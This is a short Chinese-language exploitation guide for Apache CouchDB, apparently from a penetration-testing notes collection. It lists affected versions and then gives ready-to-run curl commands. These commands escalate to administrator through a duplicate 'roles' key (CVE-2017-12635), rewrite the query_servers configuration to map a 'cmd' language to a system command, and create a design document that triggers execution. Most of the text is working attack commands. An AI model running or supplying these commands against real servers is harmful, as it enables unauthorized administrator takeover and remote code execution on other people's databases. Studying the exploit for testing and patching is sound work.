验证漏洞存在方法
    - 检查Apache CouchDB版本是否在受影响范围内（1.2.0到1.6.1；2.0.0到2.1.0）
    - 确认已具备管理员权限访问CouchDB HTTP接口

漏洞利用方法
    - 这是一个Apache CouchDB远程代码执行漏洞。攻击者通过HTTP接口修改CouchDB的query_servers配置，将自定义语言处理器映射到系统命令路径，然后创建使用该语言的设计文档来触发命令执行
    - 针对CouchDB 2.x版本，先探测服务与节点信息：
```
curl http://localhost:5984
curl http://admin:password@localhost:5984/_membership
curl http://admin:password@localhost:5984/_node/couchdb@localhost/_config/query_servers
```
    - 写入一个新的query server，把语言cmd指向任意系统命令，例如把网络配置输出到临时文件：
```
curl -X PUT 'http://admin:password@localhost:5984/_node/couchdb@localhost/_config/query_servers/cmd' -d '"/sbin/ifconfig > /tmp/df"'
```
    - 创建数据库、写入普通文档、再写入一个使用cmd语言的设计文档：
```
curl -X PUT 'http://admin:password@localhost:5984/df'
curl -X PUT 'http://admin:password@localhost:5984/df/zero' -d '{"_id": "HTP"}'
curl -X PUT 'http://admin:password@localhost:5984/df/_design/zero' -d '{"_id": "_design/zero", "views": {"anything": {"map": ""}}, "language": "cmd"}'
```
    - 如果需要先通过CVE-2017-12635提权为管理员，可提交一个包含重复roles键的用户文档：
```
curl -X PUT -d '{"type":"user","name":"hacktricks","roles":["_admin"],"roles":[],"password":"hacktricks"}' http://localhost:5984/_users/org.couchdb.user:hacktricks -H 'Content-Type: application/json'
```
